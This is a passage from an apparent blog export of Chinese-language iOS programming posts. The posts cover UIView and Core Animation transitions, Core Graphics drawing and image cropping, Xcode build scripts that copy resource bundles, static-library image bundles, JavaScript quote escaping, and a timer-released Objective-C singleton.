//设置动画属性结束 [UIView commitAnimations];//动画提交 这里会用到几个概念 animationID:这个是你每个动画的名字,是自定义的,在以后拦截动画的时候会用到 context: 自定义的想和动画交互的数据 在设置好了以上数据后,就可以通过commitAnimations让动画开始执行.但是和方法1很大的不同是,这样的动画设置可以同时提交好多个,而且有系统的做好的动画效果. 系统做好的转场效果有一个函数**setAnimationTransition:forView:cache:**是专门来控制转场效果,官方提供的转场是个枚举,而且这个函数只能在每个动画中有效一次. typedef NS_ENUM(NSInteger, UIViewAnimationTransition) &#123; UIViewAnimationTransitionNone, UIViewAnimationTransitionFlipFromLeft, UIViewAnimationTransitionFlipFromRight, UIViewAnimationTransitionCurlUp, UIViewAnimationTransitionCurlDown, &#125;; //.h + (void)setAnimationTransition:(UIViewAnimationTransition)transition forView:(UIView *)view cache:(BOOL)cache; // current limitation - only one per begin/commit block 提交多个和拦截参数先来看下官方文档和头文件 You can nest sets of animations (by calling this method again before committing a previous set of animations) as needed. Nesting animations groups them together and allows you to set different animation options for the nested group. If you install a start or stop selector using the setAnimationWillStartSelector: or setAnimationDidStopSelector: method, the values you specify for the animationID and context parameters are passed to your selectors at runtime. You can use these parameters to pass additional information to those selectors. 你可以通过begin/commit执行多个动画,但是头文件中说了,这两个必须成对出现 + (void)beginAnimations:(nullable NSString *)animationID context:(nullable void *)context; // additional context info passed to will start/did stop selectors. begin/commit can be nested + (void)commitAnimations; // starts up any animations when the top level animation is commited必须在上一个动画commit后才行 而动画的拦截方法就是**setAnimationWillStartSelector:和setAnimationDidStopSelector:**两个代理方法,可以在里面获取到ID和context. 使用CATransition在Layer层上的动画在Layer层的动画的上有很多,可以参考官方文档Core Animation Reference Collection.这里通过添加CATransition对象来举例添加动画 CATransition *animation = [CATransition animation]; animation.duration = 0.5f; //动画时长 animation.type = @&quot;cube&quot;; //过度效果 animation.subtype = @&quot;formLeft&quot;; //过渡方向 [self.view.layer addAnimation:animation forKey:@&quot;animationID&quot;]; CATransition本身分为type和subType两种,是通过字符串来传递属性的 /* The name of the transition. Current legal transition types include * `fade&#39;, `moveIn&#39;, `push&#39; and `reveal&#39;. Defaults to `fade&#39;. */ @property(copy) NSString *type; /* An optional subtype for the transition. E.g. used to specify the * transition direction for motion-based transitions, in which case * the legal values are `fromLeft&#39;, `fromRight&#39;, `fromTop&#39; and * `fromBottom&#39;. */ @property(nullable, copy) NSString *subtype; 根据官方文档查询他们的常量字符串是 //type NSString * const kCATransitionFade; NSString * const kCATransitionMoveIn; NSString * const kCATransitionPush; NSString * const kCATransitionReveal; //subType NSString * const kCATransitionFromRight; NSString * const kCATransitionFromLeft; NSString * const kCATransitionFromTop; NSString * const kCATransitionFromBottom; 但是不知道为什么网上流传着一份全部的动画效果,可以通过字符串调用实现,比如例子中的”cube”动画就不在官方文档里,但是确实可以实现. /* 过渡效果 fade //交叉淡化过渡(不支持过渡方向) push //新视图把旧视图推出去 moveIn //新视图移到旧视图上面 reveal //将旧视图移开,显示下面的新视图 cube //立方体翻滚效果 oglFlip //上下左右翻转效果 suckEffect //收缩效果，如一块布被抽走(不支持过渡方向) rippleEffect //滴水效果(不支持过渡方向) pageCurl //向上翻页效果 pageUnCurl //向下翻页效果 cameraIrisHollowOpen //相机镜头打开效果(不支持过渡方向) cameraIrisHollowClose //相机镜头关上效果(不支持过渡方向) */ /* 过渡方向 fromRight; fromLeft; fromTop; fromBottom; */ UIView层和Layer层的动画混用把一个Image放在一个View的Layer上来放大的时候，如果用UIView来做，图片不会太多的失真和闪烁的效果，但是用Core Animation来做失真和闪烁现象会很严重，效果很不好。为了解决这个问题,只要把各自的动画放在一起就可以了. [imageLayer addAnimation:[self animationOpen] forKey:@&quot;Open&quot;]; [UIView beginAnimations:@&quot;zoom out&quot; context:nil]; [UIView setAnimationDuration:1.f]; [UIView setAnimationCurve:UIViewAnimationCurveEaseOut]; cover.transform = CGAffineTransformMakeScale(5.5,5.5); cover.center = CGPointMake(629, 384); [UIView commitAnimations]; - (CAAnimation *)animationOpen &#123; CABasicAnimation *animationOpen = [CABasicAnimation animationWithKeyPath:@&quot;transform.rotation.y&quot;]; animationOpen.duration = 1; animationOpen.autoreverses = NO; animationOpen.delegate = self; //然后执行真正地打开书的内容 animationOpen.removedOnCompletion = NO; animationOpen.fillMode = kCAFillModeForwards; animationOpen.fromValue = [NSNumber numberWithFloat:-M_PI/5]; animationOpen.toValue = [NSNumber numberWithFloat:-M_PI/1.5]; return animationOpen; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"View","slug":"View","permalink":"http://yoursite.com/tags/View/"},{"name":"Animation","slug":"Animation","permalink":"http://yoursite.com/tags/Animation/"}]},{"title":"在自定义UIView上画线与根据动画机制的研究","date":"2016-01-25T15:00:00.000Z","path":"2016/01/26/在自定义UIView上画线与根据动画机制的原理自定义画布/","text":"需求是什么我们公司用了一个坑坑的密码控件TextFiled,此时需要一个6位的支付密码框,由于密码控件是封装起来的,我们改变不了,于是我们决定使用折中方案 自定义一个UIView,SubView包括一个TextFiled和一个UIView,把UIView盖在TextField上,并且自己在UIView上画出来密码控件 多么机智的刘岩姐提出这个方案的是刘岩姐,于是便有了利用Core Graghics绘图的过程,绘图是通过重写自定义View的**drawRect:**方法 static const CGFloat cornerRadius = 8.0; @interface PayPGTextFieldView () &lt;OnCharDelegate, PGTextFieldDelegate&gt; @property (nonatomic, weak) UIView *contentView; @property (nonatomic, strong) NSMutableArray *pointArray; @end #pragma mark - Draw // Only override drawRect: if you perform custom drawing. // An empty implementation adversely affects performance during animation. - (void)drawRect:(CGRect)rect &#123; [super drawRect:rect]; // Drawing code CGFloat width = rect.size.width; CGFloat height = rect.size.height; //计算图标 CGFloat singleWidth = width/_textField.m_iMaxLen; CGFloat everyWidth = singleWidth / 3; CGFloat everyHeight = everyWidth; //通过画布绘图 CGContextRef context = UIGraphicsGetCurrentContext();//获取当前画布 CGContextSetStrokeColorWithColor(context, LINE_COLOR.CGColor);//设定Stroke的颜色 CGContextSetLineWidth(context, 0.5);//设置划线的宽度 for(int idx = 1; idx &lt; _textField.m_iMaxLen; idx++) &#123; CGPoint sourcePoint = CGPointMake(singleWidth * idx, 0); CGPoint targetPoint = CGPointMake(singleWidth * idx, height); CGContextMoveToPoint(context, sourcePoint.x, sourcePoint.y);//画笔移动到起始点 CGContextAddLineToPoint(context, targetPoint.x, targetPoint.y);//画笔画到结束点 &#125; CGContextStrokePath(context);//把画笔画过的地方着色(Stroke) //根据重绘的画布设置小圆点的Frame for (int i = 0; i &lt; 6; ++i) &#123; UIView *view = _pointArray[i]; [view setFrame:CGRectMake(i *singleWidth + everyWidth, (height - everyHeight) / 2, everyWidth, everyHeight)]; view.layer.cornerRadius = everyWidth / 2; view.hidden = YES; &#125; &#125; 画方形等应该怎么画//Get the CGContext from this view CGContextRef context = UIGraphicsGetCurrentContext(); //Draw a rectangle CGContextSetFillColorWithColor(context, [UIColor redColor].CGColor); //Define a rectangle CGContextAddRect(context, CGRectMake(10.0, 150.0, 60.0, 120.0)); //X, Y, Width, Height //Draw it CGContextFillPath(context); Core Graphics和动画的层次关系我们先来盗一张图 这张图是苹果官方文档给出的动画机制的层次结构,可见Core Graphics是在动画层之下,和OpenGL同层,听上去吊吊哒. 所以说Core Graphics里的绘图是是画布层面上,直接操作的像素点.会比动画更早响应,这是是为什么如果重写drawRect:之后不设置背景色,除了被Stroke的部分都是黑色,因为没有像素(0,0,0)嘛. 动画机制原理根据参考文档描述,动画和视图的渲染有一个单独的进程,在iOS5以前这个进程叫SpringBoard,在iOS6之后叫BackBoard。我们以下统一称为render server. 在App内部的阶段 布局：在这个阶段，程序设置 View / Layer 的层级信息，设置 layer 的属性，如 frame，background color 等等。 创建 backing image：在这个阶段程序会创建 layer 的 backing image，无论是通过 setContents 将一个 image 传給 layer，还是通过 [drawRect:] 或 [drawLayer: inContext:] 来画出来的。所以 [drawRect:] 等函数是在这个阶段被调用的。 准备：在这个阶段，Core Animation 框架准备要渲染的 layer 的各种属性数据，以及要做的动画的参数，准备传递給 render server。同时在这个阶段也会解压要渲染的 image。（除了用 imageNamed：方法从 bundle 加载的 image 会立刻解压之外，其他的比如直接从硬盘读入，或者从网络上下载的 image 不会立刻解压，只有在真正要渲染的时候才会解压）。 提交：在这个阶段，Core Animation 打包 layer 的信息以及需要做的动画的参数，通过 IPC（inter-Process Communication）传递給 render server。 在App外部iOS系统层阶段 根据 layer 的各种属性（如果是动画的，会计算动画 layer 的属性的中间值 用 OpenGL 准备渲染。渲染这些可视的 layer 到屏幕。 iOS设备的屏幕刷新频率是是60HZ。如果上面的这些步骤在一个刷新周期之内无法做完（1/60s），就会造成掉帧。 参考文档优化动画效果的结论 减少隐藏的绘制：CATextLayer和UILabel都是将text画入backing image的。如果改了一个包含 text的view的frame的话,text会被重新绘制。 使用Rasterize：当有比较复杂的Layer层(Table中Cell的圆角)效果,可以使用Layer的shouldRasterize=YES（记得设置适当的rasterizationScale），Layer会被先绘制成bitmap放进内存缓存起来,读取加载会比较顺滑。这种方法适用于不经常改的Layer，如果Layer经常变，就不适合用。 避免离屏绘制：实现Rounded Corner/Layer Masks/Drop Shadows的效果可以使用 Stretchable Images。比如实现圆角可以让设计给切较小的圆形的图片,Strectch后用于BackgroundImage或者Layer的Content的属性,记得设置好ContentsCenter和ContentScale。 减少Blending&amp;Overdraw：如果一个Layer被另一个Layer完全遮盖，GPU会不渲染被遮盖的Layer,但是计算是否遮盖很消耗性能,可以通过setBackgroundColor:不透明的颜色或setOpaque:YES手动告诉GPU不要去计算遮盖 避免将几个半透明的Layer的Color融合在一起,理由也是同4。 名词解释Rasterize 在苹果的2012年WWDC大会上,引入的一个CALayer内的BOOL属性,来控制是把Layer在一个离屏绘制的Context上计算好生成bitmap再提交,还是实时运算,默认是NO. 如果你有一堆复杂动画的Layer,但是这些Layer自己并不改变,应该设置成YES,如果Layer经常改变,应该设为NO,此时如果设为YES反而会变慢 离屏绘制离屏的绘制一般两种情况： 有些效果（如 rounded corners，layer masks，drop shadows 和 layer rasterization）不能直接的绘制到屏幕上，必须先绘制到一个 image context 上，这种操作会引入额外的内存和 CPU 消耗。 实现了 drawRect 或者 drawLayer:inContext:，为了支持任意的绘制，core graphic 会创建一个大小跟要画的 view 一样的 backing image。并且当画完的以后要传输到 render server 上渲染。所以没事不要重载 drawRect 等函数却什么都不做。 参考文献[1]http://bugly.qq.com/bbs/forum.php?mod=viewthread&amp;tid=297 [2]http://stackoverflow.com/questions/19405741/when-should-i-set-layer-shouldrasterize-to-yes","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"},{"name":"View","slug":"View","permalink":"http://yoursite.com/tags/View/"}]},{"title":"通过CoreGraphics切小图","date":"2016-01-25T15:00:00.000Z","path":"2016/01/26/通过CoreGraphics切小图/","text":"怎么切图写上传头像的时候用到的需求,有时候图片需要进行调整,如何根据用户的调整进行切图,使用的是Core Graphics的画布. @interface YZFHeadImageAdjustViewController () @property (nonatomic, strong) UIImage *originalImage; @end - (UIImage *)clipEditedImage &#123; //最终切图rect CGRect subImageRect = CGRectMake(x, y, width, height); //通过Core Graphic切图 CGImageRef imageRef = _originalImage.CGImage; CGImageRef subImageRef = CGImageCreateWithImageInRect(imageRef, subImageRect); //获取subImage的大小 CGSize size; size.width = subImageRect.size.width; size.height = subImageRect.size.height; //展开一个和Size大小一样的画布 UIGraphicsBeginImageContext(size); //获得当前画布 CGContextRef context = UIGraphicsGetCurrentContext(); //在新画布上根据当前画布,画出新画布大小的,subImageRef的内容 CGContextDrawImage(context, subImageRect, subImageRef); //通过新画布创建新的UIImage UIImage* subImage = [UIImage imageWithCGImage:subImageRef]; //关闭新画布 UIGraphicsEndImageContext(); //返回小图 return subImage; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"},{"name":"Image","slug":"Image","permalink":"http://yoursite.com/tags/Image/"}]},{"title":"Project自动执行一些shell脚本","date":"2016-01-24T15:00:00.000Z","path":"2016/01/25/Project自动执行一些shell脚本/","text":"为什么需要脚本有些时候,需要在编译完成时自动做一些工作,如果你会写shell脚本(就是命令行脚本),可以添加进某个Target让它自动执行. 哪里添加脚本Project-Target-Build Phases-&quot;+&quot;-New Run Script Phases 凡是通用的shell命令行都可以用 脚本可以完成的常见工作 拷贝一些资源 检查一些选项 例如我在文章#使用Bundle打包图片配合静态库使用#中,假设静态库的Project和主工程在一个WorkSpace,不想每次更改Resource里的图片都手动重新拷贝到主工程里(不然主工程里还是旧的图片),就可以通过脚本完成. 进行Bundle拷贝脚本脚本1 这个脚本在编译时有效,打包的时候发现拷贝不进去,造成IPA包中无Resource.bundle cp -R -f $BUILT_PRODUCTS_DIR/Resource.bundle $APP_PRODUCT_CONTENTS_FOLDER_PATH 脚本2 这个脚本在打包时有效,但是在编译时会报错,因为BUILT_PRODUCTS_DIR是个快捷方式(链接),找不到实际对象 cp -R -f $BUILT_PRODUCTS_DIR/Resource.bundle $BUILT_PRODUCTS_DIR/$CONTENTS_FOLDER_PATH/ 脚本3 最终求助linux的大哥,搞了个函数,先获取Resource.bundle的实际路径,然后进行拷贝 function getRealPath() &#123; [[ `ls -lt $1 | head -1|awk &#39;&#123;print $10&#125;&#39;` == &quot;-&gt;&quot; ]] &amp;&amp; realPath=`ls -lt $1 | head -1|awk &#39;&#123;print $11&#125;&#39;`|| realPath=$1 echo &quot;$1 the real directory is:$realPath&quot; &#125; getRealPath &quot;$BUILT_PRODUCTS_DIR/Resource.bundle&quot; cp -R -f $realPath $BUILT_PRODUCTS_DIR/$CONTENTS_FOLDER_PATH/ 脚本四 后来读了读Pods脚本,发现Pods有更好的RealPath的脚本 realpath() &#123; DIRECTORY=&quot;$(cd &quot;$&#123;1%/*&#125;&quot; &amp;&amp; pwd)&quot; FILENAME=&quot;$&#123;1##*/&#125;&quot; echo &quot;$DIRECTORY/$FILENAME&quot; &#125; ABSOLUTE_XCASSET_FILE=$(realpath &quot;$&#123;PODS_ROOT&#125;/$1&quot;)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"两个Category中函数名不要相同","date":"2016-01-24T15:00:00.000Z","path":"2016/01/25/两个Category使用同一函数名的坑坑/","text":"两个Category内的函数名相同//CategoryA.h @interface UIView (CategoryA) + (UIView *)createLine:(CGRect)frame; @end //CategoryB.h @interface UIView (CategoryB) + (UIView *)createLine:(CGRect)frame; @end 由于Category都是使用UIView调用,写在不同的Category中编译时可能不报错,甚至通过Com+点击定位也正确,但是实际执行中可能想执行B的函数,实际执行的是A的 为什么会有两个Category不同的project都对UIView做了扩展,造成在一个WorkSpace中的时候编译结束造成调用错误,而且很难被发现","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Category","slug":"Category","permalink":"http://yoursite.com/tags/Category/"}]},{"title":"使用Bundle打包图片配合静态库使用","date":"2016-01-24T15:00:00.000Z","path":"2016/01/25/使用Bundle打包图片配合静态库使用/","text":"静态库怎么带图片资源由于静态库只能放代码不能带图片资源,有两种解决方案 使用Framework&lt;(￣︶￣)&gt; 使用bundle打包图片文件和静态库分别打包拷贝给别人 把图片素材传给别人 第三种方法这么坑,万一哪个文件再搞混了….所以推荐用第二种 打包Bundle由于大部分时间引用图片都是用 [UIImage ImageNamed:name]; 这种方法无法查到到我们自定义的Bundle里的图片,所以我们要写一个方法从特定的Bundle里读 从固定Bundle读图片的方法以下是完成了一个从名称为”Resource.bundle”读取文件的示例,这样给别人静态库的时候需要新建一个为Resource.bundle的Target,添加进去图片,并且与.a一起交付给使用方. //.h #import &lt;UIKit/UIKit.h&gt; @interface UIImage (Resource) + (UIImage *)resourceImageNamed:(NSString *)name; @end /.m #import &quot;UIImage+Resource.h&quot; @implementation UIImage (Resource) + (UIImage *)resourceImageNamed:(NSString *)name&#123; //先从默认目录里读 UIImage *imageFromMainBundle = [UIImage imageNamed:name]; if (imageFromMainBundle) &#123; return imageFromMainBundle; &#125; //读不到再去Bundle里读 //此处Scale是判断图片是@2x还是@3x NSInteger scale = (NSInteger)[[UIScreen mainScreen] scale]; for (NSInteger i = scale; i &gt;= 1; i--) &#123; NSString *filepath = [self getImagePath:name scale:i]; UIImage *tempImage = [UIImage imageWithContentsOfFile:filepath]; if (tempImage) &#123; return tempImage; &#125; &#125; return nil; &#125; + (NSString *)getImagePath:(NSString *)name scale:(NSInteger)scale&#123; NSURL *bundleUrl = [[NSBundle mainBundle] URLForResource:@&quot;Resource&quot; withExtension:@&quot;bundle&quot;]; NSBundle *customBundle = [NSBundle bundleWithURL:bundleUrl]; NSString *bundlePath = [customBundle bundlePath]; NSString *imgPath = [bundlePath stringByAppendingPathComponent:name]; NSString *pathExtension = [imgPath pathExtension]; //没有后缀加上PNG后缀 if (!pathExtension || pathExtension.length == 0) &#123; pathExtension = @&quot;png&quot;; &#125; //Scale是根据屏幕不同选择使用@2x还是@3x的图片 NSString *imageName = nil; if (scale == 1) &#123; imageName = [NSString stringWithFormat:@&quot;%@.%@&quot;, [[imgPath lastPathComponent] stringByDeletingPathExtension], pathExtension]; &#125; else &#123; imageName = [NSString stringWithFormat:@&quot;%@@%ldx.%@&quot;, [[imgPath lastPathComponent] stringByDeletingPathExtension], (long)scale, pathExtension]; &#125; //返回删掉旧名称加上新名称的路径 return [[imgPath stringByDeletingLastPathComponent] stringByAppendingPathComponent:imageName]; &#125; @end 建立iOS的Bundle由于Add Target里iOS下并没有Bundle,所以我们要从OS X创建,然后修改Build Setting两项 Base SDK 改成Lastest iOS 这里是指定为iOS的Bundle,否则是OS X用的 Combine High Resolution Artwork 或 COMBINE_HIDPI_IMAGES 这两项一个是OSX下的名字,一个是iOS下的名字,改为NO才可以存图片,不然存进去是tiff","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Image","slug":"Image","permalink":"http://yoursite.com/tags/Image/"}]},{"title":"工程清理没有被使用的Class","date":"2016-01-24T15:00:00.000Z","path":"2016/01/25/工程清理没有被使用的Class/","text":"查询策略今天接了一个要求,分析找出满足以下条件的Class 工程中声明了,但是没有使用的Class import的文件有没有重复或者未使用 原因 无用的.h/.m文件让ipa包太大 某些文件中import的太乱,不知道可以不可以删除 解决方案问题1解决了一半,问题目前还没找到解决方法 https://github.com/dblock/fui fui是一个ruby脚本,可以找到某个工程路径下满足以下条件的文件 具有.h和.m 没有被任何文件import 注意!是未被import不是init,如果另外一个文件import了它,但是没有init,也查不出 操作指令gem install fui cd ~/yourproject fui find","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"Xcode和JS交互的单引号坑坑","date":"2016-01-22T15:00:00.000Z","path":"2016/01/23/Xcode和JS交互的单引号坑坑/","text":"和JS交互碰到”‘“会打断字符串被打断的字符串,会造成调用JS失败,这个时候要进行转义,添加一个转义符还不行,必须两个. string = [string stringByReplacingOccurrencesOfString:@&quot;&#39;&quot; withString:@&quot;\\\\&#39;&quot;]; 为什么需要两个转义符第一个转义符用来转义第二个转义符,第二个转义符用来转义单引号,第一个转义符交给WebView用把被转义的”&#39;“穿送给JS文件,作为字符串的一部分,然后在JS使用第二个转义符转义”‘“;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"}]},{"title":"Singleton单例教程","date":"2016-01-11T15:00:00.000Z","path":"2016/01/12/Singleton单例教程/","text":"什么是单例一句话概括: 有且仅有一个实例化对象的类,可以全局访问 单例的原理: 单例在堆内存创建了一个指针,这个指针指向一个实例化的自身,且仅能实例化一次 开放一个外部访问接口,每次访问返回指针 并且重写所有可能造成二次初始化的函数,让数据仅能初始化一次,保证数据安全. 通常单例无法被释放,比如Pods里的各种模块 OC中如何创建单例(Pods式)因为已经是Xcode7.2了,所以仅仅讨论ARC模式下,以下是各种Pods库常用的单例创建模式. 干货代码//.h @interface ExampleSingleton : NSObject + (instancetype)shareInstance; @end //.m @implementation ExampleSingleton + (instancetype)shareInstance &#123; static ExampleSingleton *sharedInstance = nil; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; sharedInstance = [[ExampleSingleton alloc] init]; &#125;); //NSLog(@&quot;Access ExampleSingleton ShareInstance %p&quot;,sharedInstance); return sharedInstance; &#125; - (instancetype)init &#123; self = [super init]; if (self) &#123; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; //Initial Data &#125;); &#125; return self; &#125; @end 代码分析 开放一个类方法用来作为访问接口 声明一个ExampleSingleton的静态指针,先指向nil init和shareInstance声明一个静态的GCD计数onceToken shareInstance根据onceToken仅执行一次init,用静态指针指向实例化空间,保证其不被释放(原理1/2) 每次访问shareInstance,返回静态指针本身,传递出实例化的地址 init也根据onceToken仅初始化一次数据,以防使用者强行访问**[[ExampleSingleton shareInstance]init]**重置数据(原理3) onceToken是什么是GCD里一种计数器,本身是个long类型,每次执行一次就自动减1,直到数值小于0,不再执行.dispatch_once_t初始化的值为0,执行一次后为-1,下次再dispatch_once时由于小于0就不再执行. GCD计数在读取通讯录里也用到了dispatch_semaphore_t,可以自定义执行几次 /*! * @typedef dispatch_once_t * * @abstract * A predicate for use with dispatch_once(). It must be initialized to zero. * Note: static and global variables default to zero. */ typedef long dispatch_once_t; Tips: 值得注意的是**dispatch_once(&amp;onceToken, ^{});**采用的是传址形式,因为long为C类型的数据,详见我的C类型变量传值和传址的文章. 单例真的不可释放么由于通常单例只能被创建一份,并且伴随着Application的生命周期可以全局访问,所以好多教程中都说单例不可以被释放.其实这个观点是错误的,单例不可被释放只是保证了他的安全性. 如果我有一个模块,需要一个资源池,但是我不保证模块什么时候被启动,设置一个伴随着Application的单例感觉会浪费内存,可不可以实现随着模块启动创建资源池,模块关闭停止资源池.以下是我自己可以随时启动和关闭的单例. 一个可以被释放的单例@interface ExampleSingleton : NSObject + (instancetype)shareInstance; + (void)haltSharedInstance; @end static ExampleSingleton *_sharedInstance = nil; static dispatch_once_t _onceToken; @implementation ExampleSingleton + (instancetype)shareInstance &#123; dispatch_once(&amp;onceToken, ^&#123; _sharedInstance = [[ExampleSingleton alloc] init]; if(_sharedInstance) &#123; //Initial Data &#125; NSLog(@&quot;ExampleSingleton ShareInstance Did Create %p&quot;,sharedInstance); &#125;); //NSLog(@&quot;Access ExampleSingleton %p&quot;,sharedInstance); return _sharedInstance; &#125; + (void)haltSharedInstance &#123; if (_sharedInstance) &#123; _sharedInstance = nil; _onceToken = 0; &#125; &#125; - (instancetype)init &#123; self = [super init]; return self; &#125; - (void)dealloc &#123; NSLog(@&quot;ExampleSingleton SharedInstance Did Halted &quot;); &#125; 在这个单例中,使用静态的全局指针**_sharedInstance**控制单例生命周期 把Pods式的数据初始化放在了sharedInstance函数中,保证只能执行一次. 使用类方法haltSharedInstance关闭单例 通过日志监控生命周期 关闭单例的原理是把静态的全局指针**_sharedInstance置为nil,从而使内存地址的retainCount为0,让ARC自动释放掉内存空间,并且把静态指针_onceToken**重新置为0,让下次执行shareInstance时可以再次初始化. 可不可以再作一点,让单例自己释放掉自己开发过程中又遇到一个需求从手机读取通讯录并且把姓名转为小写拼音进行排序,由于5C以前的机型转换小写拼音特别卡,所以想使用一个资源池,不同的功能都可以来访问,读取转换的结果,但是如果我长期不来访问,感觉这个单例占着内存不释放很不爽,而且万一用户在程序运行期间更新了通讯录,不知道何时更新资源池中的数据 为了这个需求,于是出现了以下这个作死的单例,功能如下 单例创建可以被全局访问 单例可以收手动回收 如果10分钟(600秒)内没有操作接入单例,单例自己把自己释放掉 最终代码如下 @interface ExampleSingleton : NSObject + (instancetype)shareInstance; + (void)haltSharedInstance; + (void)resetTimer; @end static ExampleSingleton *_sharedInstance = nil; static dispatch_once_t _onceToken; static NSTimer *_timer = nil; @implementation ExampleSingleton + (instancetype)shareInstance &#123; dispatch_once(&amp;_onceToken, ^&#123; _sharedInstance = [[ExampleSingleton alloc] init]; if(_sharedInstance) &#123; //Initial Data &#125; NSLog(@&quot;ExampleSingleton ShareInstance Did Create %p&quot;,_sharedInstance); &#125;); NSLog(@&quot;Access ExampleSingleton %p&quot;,_sharedInstance); [self resetTimer]; return _sharedInstance; &#125; + (void)haltSharedInstance &#123; NSLog(@&quot;SharedInstance Will Halted&quot;); if (_sharedInstance) &#123; _sharedInstance = nil; _onceToken = 0; &#125; &#125; + (void)resetTimer &#123; if (_timer.isValid) &#123; [_timer invalidate]; NSLog(@&quot;SharedInstance Reset Timer&quot;); &#125; _timer= [NSTimer scheduledTimerWithTimeInterval:600 target:self selector:@selector(haltSharedInstance) userInfo:nil repeats:NO]; &#125; - (void)dealloc &#123; NSLog(@&quot;SharedInstance Did Halted &quot;); &#125; - (instancetype)init &#123; self = [super init]; if (self) &#123; &#125; return self; &#125; 作死过程中遇到的问题(可以不看,比较枯燥)测试过程中十分钟改为10秒 第一版代码+ (instancetype)shareInstance &#123; dispatch_once(&amp;_onceToken, ^&#123; _sharedInstance = [[ExampleSingleton alloc] init]; &#125;); _timer= [NSTimer scheduledTimerWithTimeInterval:10 target:self selector:@selector(timeEndHaltSharedInstance) userInfo:nil repeats:NO]; return _sharedInstance; &#125; - (void)timeEndHaltSharedInstance &#123; NSLog(@&quot;SharedInstance Will Halted By Time &quot;); [[self class] haltSharedInstance]; &#125; 第一版代码中,直接让_timer在shareInstance初始化,每次接入都重新初始化一次,这样上一次内存地址的**_timer**会被释放掉,然后执行halt函数.发现会Crash.原因是timeEndHaltSharedInstance是成员方法,类方法中的self是[self Class]类名,成员方法传给类名所以Crash. 第二版代码+ (instancetype)shareInstance &#123; dispatch_once(&amp;_onceToken, ^&#123; _sharedInstance = [[ExampleSingleton alloc] init]; &#125;); _timer= [NSTimer scheduledTimerWithTimeInterval:10 target:_sharedInstance selector:@selector(timeEndHaltSharedInstance) userInfo:nil repeats:NO]; return _sharedInstance; &#125; 把执行地址改变之后,用_sharedInstance代替self,可以把成员方法发送给成员.但是产生了一个问题,由于存在成员方法,每次创建的timer和_sharedInstance会互相retain,所以接入了多少次就需要等多少次才能最后释放.日志如下 2016-01-12 16:46:32.276 Learn[31993:6644441] Access ShareInstance 0x7ffefac07870 2016-01-12 16:46:34.644 Learn[31993:6644441] Access ShareInstance 0x7ffefac07870 2016-01-12 16:46:34.644 Learn[31993:6644441] Reset Timer 2016-01-12 16:46:36.154 Learn[31993:6644441] Access ShareInstance 0x7ffefac07870 2016-01-12 16:46:36.155 Learn[31993:6644441] Reset Timer 2016-01-12 16:46:42.279 Learn[31993:6644441] SharedInstance Did Halted By Time 2016-01-12 16:46:44.645 Learn[31993:6644441] SharedInstance Did Halted By Time 2016-01-12 16:46:46.156 Learn[31993:6644441] SharedInstance Did Halted By Time 2016-01-12 16:46:46.156 Learn[31993:6644441] SharedInstance Did Halted 虽然最后总时间还是10秒,但是由于接入频率过高的时候,可能造成内存溢出,因为不能被回收的内存太多 第三版代码+ (instancetype)shareInstance &#123; dispatch_once(&amp;onceToken, ^&#123; _sharedInstance = [[ExampleSingleton alloc] init]; &#125;); [_sharedInstance resetTimer]; return _sharedInstance; &#125; ...... //其余代码和以上一样 ...... - (void)resetTimer &#123; if (_timer.isValid) &#123; [_timer invalidate]; NSLog(@&quot;Reset Timer&quot;); &#125; _timer= [NSTimer scheduledTimerWithTimeInterval:600 target:_sharedInstance selector:@selector(timeEndHaltSharedInstance) userInfo:nil repeats:NO]; &#125; 第三版代码在每次重置前,查询是否存在计时器,有的话就使用invalidate函数释放掉旧的计时器.算是完整实现功能了 反思可是改了这么久,发现绕了一个大弯,无非是想及时释放旧的计时器,从而防止内存溢出,关键在于,使用了成员方法,让计时器本身被_sharedInstance产生retain.所以就去尝试使用了类方法. 第四版代码使用了类方法代替成员方法 + (instancetype)shareInstance &#123; dispatch_once(&amp;_onceToken, ^&#123; _sharedInstance = [[ExampleSingleton alloc] init]; &#125;); _timer= [NSTimer scheduledTimerWithTimeInterval:10 target:self selector:@selector(haltSharedInstance) userInfo:nil repeats:NO]; return _sharedInstance; &#125; + (void)haltSharedInstance &#123; NSLog(@&quot;SharedInstance Did Halted By Time &quot;); if (_sharedInstance) &#123; _sharedInstance = nil; _onceToken = 0; &#125; &#125; 输出日志如下 2016-01-12 17:21:48.079 Learn[32311:6674061] access ShareInstance 0x7fd9f96533f0 2016-01-12 17:21:49.255 Learn[32311:6674061] access ShareInstance 0x7fd9f96533f0 2016-01-12 17:21:49.935 Learn[32311:6674061] access ShareInstance 0x7fd9f96533f0 2016-01-12 17:21:58.084 Learn[32311:6674061] SharedInstance Did Halted By Time 2016-01-12 17:21:58.084 Learn[32311:6674061] SharedInstance Did Halted 2016-01-12 17:21:59.258 Learn[32311:6674061] SharedInstance Did Halted By Time 2016-01-12 17:21:59.939 Learn[32311:6674061] SharedInstance Did Halted By Time 发现如果使用类方法,发现scheduledTimerWithTimeInterval中的类方法不会对SharedInstance产生retain,使得第一个计时器到时间就会终止掉单例.说明旧的计时器还是没有被释放掉. 总结 所以说通过**[_timer invalidate]**手动释放计时器还是必须的 不能使用成员方法让SharedInstance的Retain增加,因为可能造成Retain数过高无法手动释放 